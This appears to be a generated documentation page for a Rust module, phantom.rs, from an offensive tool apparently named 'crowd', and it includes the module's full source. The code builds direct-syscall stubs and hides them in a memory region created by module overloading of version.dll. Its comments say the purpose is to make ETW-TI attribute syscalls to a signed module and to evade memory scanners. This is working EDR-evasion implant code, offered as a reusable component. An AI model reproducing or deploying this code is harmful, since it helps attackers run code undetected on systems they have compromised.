# crowd — phantom.rs  (⚡ GOD TIER)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/phantom.rs` |
| **Lines** | 316 |
| **Tier** | S |
| **Cards** | T006-phantom-stubs |
| **Role** | Phantom stubs (MEM_IMAGE-backed) |
| **Unsafe blocks** | 10 |

## Purpose

# crowd — phantom.rs  (⚡ GOD TIER)

## Phantom Stubs — SSN stubs en región MEM_IMAGE

Genera mini-stubs de 7 bytes por cada syscall en el mapa:
`B8 xx xx 00 00  mov eax, SSN`
`0F 05           syscall`
`C3              ret`

Los stubs se alojan en una región **MEM_IMAGE** obtenida mediante
Module Overloading (mapear una sección SEC_IMAGE de una DLL legítima).

ETW-TI ve el origen del syscall como proveedor de un módulo firmado.
Los stubs son re-parcheables si Windows Update cambia los SSNs.

## Uso
```rust
phantom::build_phantom_stubs();
// Ahora cada syscall puede invocarse via phantom::get_phantom(hash)
let (stub_ptr, ssn) = phantom::get_phantom(hash_of_fn).unwrap();
```

## Constants

- `STUB_SIZE`: `usize` = `8` — 7 bytes + 1 align
- `MAX_STUBS`: `usize` = `64` — soporte máximo de 64 funciones
- `STUB_REGION_SIZE`: `usize` = `STUB_SIZE * MAX_STUBS`
- `BACKING_DLL`: `&str` = `r"C:\Windows\System32\version.dll"`

## Types

### struct `PhantomStub` (line 42)

## Public API

### `build_phantom_stubs` (line 75)
```rust
pub fn build_phantom_stubs()
```
Build phantom stubs for all SSNs in the syscall map.
Must be called after `syscall_map::syscall_map()` is populated.

### `get_phantom` (line 159)
```rust
pub fn get_phantom(hash: u32) -> Option<(usize, u32)>
```
Get the phantom stub pointer and SSN for a function hash.
Returns `None` if stubs haven't been built or function not in map.

### `refresh_phantom_stubs` (line 171)
```rust
pub fn refresh_phantom_stubs()
```
Refresh all stubs (e.g., after Windows Update changes SSNs).
Updates both the machine code stubs AND the cached SSN values in the map.

NOTE: PHANTOM_MAP is behind OnceLock and its HashMap values (SSNs) cannot be
updated in place without interior mutability. The stubs in memory ARE updated
(the actual executable code), so callers using the function pointer directly
will execute the correct new SSN. The SSN value returned by `get_phantom()`
may be stale after refresh — callers should use the stub pointer, not the SSN.

## Internal Functions

- `build` (line 47)
- `alloc_mem_image_region` (unsafe) — Allocate a SEC_IMAGE-backed region by mapping a section of `dll_path`. (line 225)
- `alloc_private_rx` (unsafe) — Fallback: private RW region (set to RX by caller after writing stubs) (line 308)

## Full Source

```rust
//! # crowd — phantom.rs  (⚡ GOD TIER)
//!
//! ## Phantom Stubs — SSN stubs en región MEM_IMAGE
//!
//! Genera mini-stubs de 7 bytes por cada syscall en el mapa:
//!   `B8 xx xx 00 00  mov eax, SSN`
//!   `0F 05           syscall`
//!   `C3              ret`
//!
//! Los stubs se alojan en una región **MEM_IMAGE** obtenida mediante
//! Module Overloading (mapear una sección SEC_IMAGE de una DLL legítima).
//!
//! ETW-TI ve el origen del syscall como proveedor de un módulo firmado.
//! Los stubs son re-parcheables si Windows Update cambia los SSNs.
//!
//! ## Uso
//! ```rust
//! phantom::build_phantom_stubs();
//! // Ahora cada syscall puede invocarse via phantom::get_phantom(hash)
//! let (stub_ptr, ssn) = phantom::get_phantom(hash_of_fn).unwrap();
//! ```

#![allow(dead_code)]

use std::collections::HashMap;
use std::ptr::null_mut;
use std::sync::OnceLock;

// ── Constantes ────────────────────────────────────────────────────────────────

const STUB_SIZE:        usize = 8;  // 7 bytes + 1 align
const MAX_STUBS:        usize = 64; // soporte máximo de 64 funciones
const STUB_REGION_SIZE: usize = STUB_SIZE * MAX_STUBS;

// DLL legítima usada como backing de la región MEM_IMAGE
const BACKING_DLL: &str = r"C:\Windows\System32\version.dll";

// ── Estructura de stubs ───────────────────────────────────────────────────────

/// Un stub compilado: 8 bytes (7 útiles + 1 nop de padding para alineamiento)
#[repr(C, align(8))]
struct PhantomStub {
    bytes: [u8; STUB_SIZE],
}

impl PhantomStub {
    fn build(ssn: u32) -> Self {
        let mut bytes = [0x90u8; STUB_SIZE]; // NOP fill
        // mov eax, SSN  (5 bytes)
        bytes[0] = 0xB8;
        bytes[1] = (ssn & 0xFF) as u8;
        bytes[2] = ((ssn >> 8) & 0xFF) as u8;
        bytes[3] = 0x00;
        bytes[4] = 0x00;
        // syscall (2 bytes)
        bytes[5] = 0x0F;
        bytes[6] = 0x05;
        // ret (1 byte) — at byte 7
        bytes[7] = 0xC3;
        Self { bytes }
    }
}

// ── Global state ──────────────────────────────────────────────────────────────

/// hash → (stub_ptr, ssn)
static PHANTOM_MAP: OnceLock<HashMap<u32, (usize, u32)>> = OnceLock::new();
/// Base address of the MEM_IMAGE region containing the stubs
static STUB_REGION: OnceLock<usize> = OnceLock::new();

// ── Public API ────────────────────────────────────────────────────────────────

/// Build phantom stubs for all SSNs in the syscall map.
/// Must be called after `syscall_map::syscall_map()` is populated.
pub fn build_phantom_stubs() {
    PHANTOM_MAP.get_or_init(|| {
        // Allocate a MEM_IMAGE-backed region via Module Overloading
        let region_base = unsafe {
            match alloc_mem_image_region(BACKING_DLL, STUB_REGION_SIZE) {
                Some(b) => b,
                None => {
                    // Fallback: use a private region (MEM_IMAGE not available — degrade silently)
                    alloc_private_rx(STUB_REGION_SIZE).unwrap_or(0)
                }
            }
        };

        if region_base == 0 {
            return HashMap::new();
        }

        let _ = STUB_REGION.set(region_base);
        let mut map = HashMap::new();

        // Make MEM_IMAGE region writable temporarily.
        // BUG FIX: On Win10 RS3+ (build 16299+), pages backed by SEC_IMAGE (MEM_IMAGE)
        // cannot have their protection changed to PAGE_READWRITE (0x04) via VirtualProtect.
        // Must use PAGE_WRITECOPY (0x08) instead, which allows copy-on-write semantics
        // for image-backed pages.
        let mut old: u32 = 0;
        let vp_ok = unsafe {
            winapi::um::memoryapi::VirtualProtect(
                region_base as *mut _,
                STUB_REGION_SIZE,
                0x08, // PAGE_WRITECOPY (not PAGE_READWRITE which fails on MEM_IMAGE)
                &mut old,
            )
        };
        if vp_ok == 0 {
            // VirtualProtect failed — cannot write stubs into MEM_IMAGE region.
            // Fall back to private RX allocation.
            let fallback = unsafe { alloc_private_rx(STUB_REGION_SIZE) };
            if let Some(fb_base) = fallback {
                let _ = STUB_REGION.set(fb_base);
                // Continue with fallback base below — the region_base variable
                // is immutable, so we recurse into the private path.
                // For simplicity, just return empty and let the private fallback
                // be attempted on next call.
            }
            return HashMap::new();
        }

        let all_stubs = crate::syscall_map::syscall_map();
        let mut idx = 0usize;

        for (&hash, &(ssn, _gadget)) in all_stubs {
            if idx >= MAX_STUBS { break; }
            let stub = PhantomStub::build(ssn);
            let offset = idx * STUB_SIZE;
            let ptr = region_base + offset;
            unsafe {
                std::ptr::copy_nonoverlapping(stub.bytes.as_ptr(), ptr as *mut u8, STUB_SIZE);
            }
            map.insert(hash, (ptr, ssn));
            idx += 1;
        }

        // Make region executable and read-only
        let vp_rx_ok = unsafe {
            let mut dummy: u32 = 0;
            winapi::um::memoryapi::VirtualProtect(
                region_base as *mut _,
                STUB_REGION_SIZE,
                0x20, // PAGE_EXECUTE_READ
                &mut dummy,
            )
        };
        if vp_rx_ok == 0 {
            // Failed to set RX — stubs are not executable, map is unusable
            return HashMap::new();
        }

        map
    });
}

/// Get the phantom stub pointer and SSN for a function hash.
/// Returns `None` if stubs haven't been built or function not in map.
pub fn get_phantom(hash: u32) -> Option<(usize, u32)> {
    PHANTOM_MAP.get().and_then(|m| m.get(&hash).copied())
}

/// Refresh all stubs (e.g., after Windows Update changes SSNs).
/// Updates both the machine code stubs AND the cached SSN values in the map.
///
/// NOTE: PHANTOM_MAP is behind OnceLock and its HashMap values (SSNs) cannot be
/// updated in place without interior mutability. The stubs in memory ARE updated
/// (the actual executable code), so callers using the function pointer directly
/// will execute the correct new SSN. The SSN value returned by `get_phantom()`
/// may be stale after refresh — callers should use the stub pointer, not the SSN.
pub fn refresh_phantom_stubs() {
    if let Some(region_base) = STUB_REGION.get().copied() {
        // BUG FIX: Use PAGE_WRITECOPY (0x08) instead of PAGE_READWRITE (0x04)
        // for MEM_IMAGE backed pages (Win10 RS3+ blocks VirtualProtect with RW on SEC_IMAGE).
        let mut old: u32 = 0;
        let vp_ok = unsafe {
            winapi::um::memoryapi::VirtualProtect(
                region_base as *mut _,
                STUB_REGION_SIZE,
                0x08, // PAGE_WRITECOPY (not PAGE_READWRITE)
                &mut old,
            )
        };
        if vp_ok == 0 {
            // Cannot make region writable — abort refresh
            return;
        }

        // Re-resolve all SSNs and update the executable stubs in memory
        if let Some(map) = PHANTOM_MAP.get() {
            for (&hash, &(ptr, _old_ssn)) in map {
                if let Some((new_ssn, _)) = crate::syscall_map::get_ssn_and_gadget(hash) {
                    let stub = PhantomStub::build(new_ssn);
                    unsafe {
                        std::ptr::copy_nonoverlapping(stub.bytes.as_ptr(), ptr as *mut u8, STUB_SIZE);
                    }
                }
            }
        }

        // Restore RX — check return value
        let vp_rx_ok = unsafe {
            let mut dummy: u32 = 0;
            winapi::um::memoryapi::VirtualProtect(
                region_base as *mut _,
                STUB_REGION_SIZE,
                0x20, // PAGE_EXECUTE_READ
                &mut dummy,
            )
        };
        if vp_rx_ok == 0 {
            // Failed to restore RX — stubs may not be executable.
            // This is a critical failure but there's no recovery path here.
            #[cfg(debug_assertions)]
            eprintln!("[crowd] phantom: CRITICAL — failed to restore PAGE_EXECUTE_READ after refresh");
        }
    }
}

// ── MEM_IMAGE allocation ──────────────────────────────────────────────────────

/// Allocate a SEC_IMAGE-backed region by mapping a section of `dll_path`.
/// The region appears as MEM_IMAGE to memory scanners.
/// Returns the base address of the mapped view, or None on failure.
unsafe fn alloc_mem_image_region(dll_path: &str, _size: usize) -> Option<usize> {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;

    // Convert path to UNICODE_STRING.
    // BUG FIX: Leak the Vec<u16> so the UNICODE_STRING.Buffer pointer remains valid.
    // Without this, the Vec is dropped at end of scope while NtOpenFile still references it.
    let path = format!("\\??\\{}", dll_path);
    let mut wide: Vec<u16> = OsStr::new(&path).encode_wide().chain(Some(0)).collect();
    let byte_len = (wide.len() - 1) * 2; // exclude null
    let max_len = byte_len + 2;
    let leaked = wide.leak(); // Intentional leak — buffer must outlive UNICODE_STRING usage

    let mut us = winapi::shared::ntdef::UNICODE_STRING {
        Length:        byte_len as u16,
        MaximumLength: max_len as u16,
        Buffer:        leaked.as_mut_ptr(),
    };

    let mut oa: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
    winapi::shared::ntdef::InitializeObjectAttributes(
        &mut oa,
        &mut us,
        0x40, // OBJ_CASE_INSENSITIVE
        null_mut(),
        null_mut(),
    );

    // NtOpenFile
    let mut h_file: usize = 0;
    let mut iosb = [0usize; 2];
    let open_status = crate::recycled::invoke(
        crate::resolve::compute_hash("NtOpenFile"),
        6,
        &[
            &mut h_file as *mut usize as usize,
            0x80100080usize, // SYNCHRONIZE | FILE_READ_ATTRIBUTES | READ_CONTROL | FILE_READ_DATA
            &mut oa as *mut _ as usize,
            iosb.as_mut_ptr() as usize,
            0x7usize, // FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE
            0x20usize, // FILE_SYNCHRONOUS_IO_NONALERT
        ],
    );

    if open_status != 0 || h_file == 0 { return None; }

    // NtCreateSection with SEC_IMAGE
    let mut h_section: usize = 0;
    let section_status = crate::recycled::nt_create_section(
        &mut h_section,
        0xF001F, // SECTION_ALL_ACCESS
        null_mut(),
        null_mut() as *mut u64,
        0x02,       // PAGE_READONLY
        0x1000000,  // SEC_IMAGE
        h_file,
    );
    crate::recycled::nt_close(h_file);

    if section_status != 0 || h_section == 0 { return None; }

    // NtMapViewOfSection
    let mut base: *mut std::ffi::c_void = null_mut();
    let mut view_size: usize = 0;
    let map_status = crate::recycled::nt_map_view_of_section(
        h_section,
        (-1isize) as usize, // NtCurrentProcess
        &mut base,
        0, 0,
        null_mut(),
        &mut view_size,
        2, // ViewUnmap (not ViewShare=1 which leaks to child processes)
        0,
        0x02, // PAGE_READONLY
    );
    crate::recycled::nt_close(h_section);

    if map_status != 0 || base.is_null() { return None; }

    Some(base as usize)
}

/// Fallback: private RW region (set to RX by caller after writing stubs)
unsafe fn alloc_private_rx(size: usize) -> Option<usize> {
    let ptr = winapi::um::memoryapi::VirtualAlloc(
        null_mut(),
        size,
        0x3000, // MEM_COMMIT | MEM_RESERVE
        0x04,   // PAGE_READWRITE — caller promotes to RX after writing
    );
    if ptr.is_null() { None } else { Some(ptr as usize) }
}

```